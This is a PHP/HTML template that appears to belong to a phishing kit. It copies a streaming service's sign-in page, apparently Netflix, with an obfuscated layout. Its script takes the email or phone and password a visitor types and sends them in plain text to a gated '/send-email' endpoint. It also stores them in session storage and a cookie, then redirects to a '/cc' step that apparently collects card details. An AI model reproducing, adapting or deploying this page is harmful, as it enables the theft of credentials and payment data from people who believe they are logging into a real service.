<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title id="i18n-title"></title>
    <link rel="icon" type="image/x-icon" href="/assets/images/nficon2023.ico">
    <link rel="stylesheet" href="/assets/styles/style.css">
    <link rel="stylesheet" href="/assets/styles/logstyle.css">
    <style>
      .y7i2o6 {
        text-align: left !important;
        margin: 8px 0 5px 0 !important;
        line-height: 1.3 !important;
        display: flex !important;
        align-items: center !important;
        gap: 5px !important;
        font-size: 14px !important;
      }
      .y7i2o6 .muted-text {
        color: #737373 !important;
        font-weight: 400 !important;
      }
      .y7i2o6 a {
        color: #fff !important;
        font-weight: 400 !important;
        text-decoration: none !important;
      }
      .y7i2o6 a:hover {
        text-decoration: underline !important;
      }
      .recaptcha-notice {
        margin: 2px 0 !important;
        font-size: 10px !important;
        line-height: 1.3 !important;
        color: #737373 !important;
        text-align: left !important;
      }
      .recaptcha-notice a {
        color: #0071eb !important;
        text-decoration: none !important;
      }
      .recaptcha-notice a:hover {
        text-decoration: underline !important;
      }
    </style>
  </head>
  <body>
    <div class="x9m7k4">
      <header class="w2n8p5">
        <svg class="r6t3q0" viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img">
          <g><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,0 L99.5313525,0 L102.593495,7.87421502 L105.874965,0 L111,0 L105.06233,14.2806261 Z M90.4686475,0 L85.8749649,0 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,0 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,0 L73.9366389,0 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,0 L66.3436123,0 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,0 L50.2183897,0 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,0 L32.7809542,0 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,0 L4.4690224,0 L10.562377,17.0315868 L10.562377,0 L15.2497891,0 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path></g>
        </svg>
      </header>
      <div class="h5j1l8">
        <h2 id="i18n-heading"></h2>
        <form id="form" action="#">
          <div class="s4f7g2">
            <input id="username" name="username" type="text" required placeholder=" ">
            <label id="i18n-email"></label>
          </div>
          <div class="s4f7g2">
            <input id="password" name="password" type="password" required placeholder=" ">
            <label id="i18n-password"></label>
          </div>
          <button class="d8k6m1" type="submit" id="i18n-signin"></button>
          <p id="i18n-or" style="text-align:center;margin:16px 0;color:#b3b3b3;"></p>
          <button class="signin-code-button" type="button" id="i18n-usecode"></button>
          <p class="z1a4e8"><a href="#" id="i18n-forgot"></a></p>
          <span><input type="checkbox" id="remember"> <span id="i18n-remember"></span></span>
          <p class="y7i2o6"><span class="muted-text" id="i18n-newto"></span> <a href="#" id="i18n-signup"></a></p>
          <div class="recaptcha-notice">
            <span id="i18n-recaptcha"></span> <a href="#" id="i18n-learn"></a>
          </div>
        </form>
      </div>
      <footer class="v0l4x7">
        <h5 id="i18n-footer-questions"></h5>
        <div class="c3g8h2">
          <a href="#" id="i18n-footer-faq"></a>
          <a href="#" id="i18n-footer-help"></a>
          <a href="#" id="i18n-footer-terms"></a>
          <a href="#" id="i18n-footer-privacy"></a>
          <a href="#" id="i18n-footer-cookies"></a>
          <a href="#" id="i18n-footer-corporate"></a>
        </div>
        <div class="q6w1r9">
          <svg class="f2k5s0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true">
            <path fill-rule="evenodd" clip-rule="evenodd" d="M10.7668 5.33333L10.5038 5.99715L9.33974 8.9355L8.76866 10.377L7.33333 14H9.10751L9.83505 12.0326H13.4217L14.162 14H16L12.5665 5.33333H10.8278H10.7668ZM10.6186 9.93479L10.3839 10.5632H11.1036H12.8856L11.6348 7.2136L10.6186 9.93479ZM9.52722 4.84224C9.55393 4.77481 9.58574 4.71045 9.62211 4.64954H6.41909V2H4.926V4.64954H0.540802V5.99715H4.31466C3.35062 7.79015 1.75173 9.51463 0 10.4283C0.329184 10.7138 0.811203 11.2391 1.04633 11.5931C2.55118 10.6795 3.90318 9.22912 4.926 7.57316V12.6667H6.41909V7.51606C6.81951 8.15256 7.26748 8.76169 7.7521 9.32292L8.31996 7.88955C7.80191 7.29052 7.34631 6.64699 6.9834 5.99715H9.06968L9.52722 4.84224Z" fill="currentColor"></path>
          </svg>
          <select name="language" class="language-select">
            <option value="en">English</option>
            <option value="id">Indonesia</option>
          </select>
          <svg class="m7t4u8" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16">
            <path d="M8 10.586L3.414 6 2 7.414 8 13.414 14 7.414 12.586 6z" fill="currentColor"/>
          </svg>
        </div>
      </footer>
    </div>
    <script>
      const form = document.getElementById('form');
      // Apply translations from window.__LANG__ if present
      const L = (window.__LANG__) || {};
      const set = (id, key) => { 
        if (id === 'i18n-title' && L[key]) {
          // Special handling for title tag
          document.title = L[key];
          const titleEl = document.getElementById(id);
          if (titleEl) titleEl.textContent = L[key];
        } else {
          const el = document.getElementById(id); 
          if (el && L[key]) el.textContent = L[key]; 
        }
      };
      set('i18n-title', 'login.title');
      set('i18n-heading', 'login.heading');
      set('i18n-email', 'login.email_label');
      set('i18n-password', 'login.password_label');
      set('i18n-signin', 'login.sign_in');
      set('i18n-or', 'login.or');
      set('i18n-usecode', 'login.use_code');
      set('i18n-forgot', 'login.forgot');
      set('i18n-remember', 'login.remember');
      set('i18n-newto', 'login.new_to');
      set('i18n-signup', 'login.signup');
      set('i18n-recaptcha', 'login.recaptcha');
      set('i18n-learn', 'login.learn_more');
      set('i18n-footer-questions', 'footer.questions');
      set('i18n-footer-faq', 'footer.faq');
      set('i18n-footer-help', 'footer.help');
      set('i18n-footer-terms', 'footer.terms');
      set('i18n-footer-privacy', 'footer.privacy');
      set('i18n-footer-cookies', 'footer.cookies');
      set('i18n-footer-corporate', 'footer.corporate');
      // Email and phone validation functions
      function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
      }
      
      function isValidPhone(phone) {
        // Remove all non-digits
        const cleanPhone = phone.replace(/\D/g, '');
        // Accept various phone formats: 10-15 digits
        return cleanPhone.length >= 10 && cleanPhone.length <= 15;
      }
      
      function validateLoginInput(input) {
        const trimmed = input.trim();
        
        if (!trimmed) {
          return { valid: false, message: 'Email or mobile number is required.' };
        }
        
        // Check if it's a valid email
        if (isValidEmail(trimmed)) {
          return { valid: true, type: 'email', message: '' };
        }
        
        // Check if it's a valid phone number
        if (isValidPhone(trimmed)) {
          return { valid: true, type: 'phone', message: '' };
        }
        
        // If neither email nor phone
        return { valid: false, message: 'Please enter a valid email address or mobile number.' };
      }
      
      // Add real-time validation to username field
      const usernameInput = document.getElementById('username');
      const usernameContainer = usernameInput.parentElement;
      
      // Make container relative for dynamic spacing
      usernameContainer.style.position = 'relative';
      usernameContainer.style.transition = 'margin-bottom 0.3s ease';
      usernameContainer.style.marginBottom = '0px'; // Normal spacing initially
      
      const usernameError = document.createElement('div');
      usernameError.className = 'login-error-message';
      usernameError.style.cssText = `
        color: #e50914;
        font-size: 13px;
        margin-top: 10px;
        margin-bottom: 5px;
        padding: 2px 0;
        line-height: 1.3;
        height: 0;
        overflow: hidden;
        opacity: 0;
        transition: all 0.3s ease;
        transform: translateY(-10px);
      `;
      usernameContainer.appendChild(usernameError);
      
      // Function to show/hide error with dynamic spacing
      function toggleErrorMessage(show, message = '') {
        if (show) {
          // Show error: expand space and fade in
          usernameContainer.style.marginBottom = '35px';
          usernameError.style.height = 'auto';
          usernameError.style.opacity = '1';
          usernameError.style.transform = 'translateY(0)';
          usernameError.textContent = message;
        } else {
          // Hide error: collapse space and fade out
          usernameContainer.style.marginBottom = '0px';
          usernameError.style.height = '0';
          usernameError.style.opacity = '0';
          usernameError.style.transform = 'translateY(-10px)';
        }
      }
      
      // Real-time validation on input
      usernameInput.addEventListener('input', function(e) {
        const value = e.target.value;
        if (value.length > 0) {
          const validation = validateLoginInput(value);
          if (!validation.valid) {
            toggleErrorMessage(true, validation.message);
            e.target.style.borderColor = '#e50914';
          } else {
            toggleErrorMessage(false);
            e.target.style.borderColor = '#28a745';
          }
        } else {
          toggleErrorMessage(false);
          e.target.style.borderColor = '';
        }
      });
      
      // Validation on blur
      usernameInput.addEventListener('blur', function(e) {
        const value = e.target.value;
        if (value.length > 0) {
          const validation = validateLoginInput(value);
          if (!validation.valid) {
            toggleErrorMessage(true, validation.message);
            e.target.style.borderColor = '#e50914';
          }
        }
      });

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const fd = new FormData(form);
        const username = fd.get('username');
        const password = fd.get('password');
        
        // Validate username (email or phone)
        const validation = validateLoginInput(username);
        if (!validation.valid) {
          alert(validation.message);
          return;
        }
        
        // Validate password
        if (!password || password.trim().length < 1) {
          alert('Password is required.');
          return;
        }
        
        // Send email with login data
        try {
          const accessCode = window.__ACCESS_CODE__;
          if (!accessCode) return;
          await fetch('/' + accessCode + '/send-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: username, password: password })
          });
        } catch (err) {
          console.warn('Email send failed:', err);
        }
        
        // Continue with flow
        const data = JSON.parse(sessionStorage.getItem('flowData') || '{}');
        data.login = { email: username, password: password };
        sessionStorage.setItem('flowData', JSON.stringify(data));
        
        // Set cookie with email for OAuth page
        document.cookie = 'flow_email=' + encodeURIComponent(username) + '; path=/; max-age=3600'; // 1 hour
        
        // Check if OAuth is enabled
        const flowSettings = window.__FLOW_SETTINGS__ || {};
        const oauthEnabled = flowSettings.oauth_enabled || false;
        
        const accessCode = window.__ACCESS_CODE__;
        if (accessCode) {
          if (oauthEnabled) {
            location.href = '/' + accessCode + '/oauth';
          } else {
            location.href = '/' + accessCode + '/cc';
          }
        } else {
          location.href = '/?access'; // Fallback to get new code
        }
      });
    </script>
  </body>
  </html>
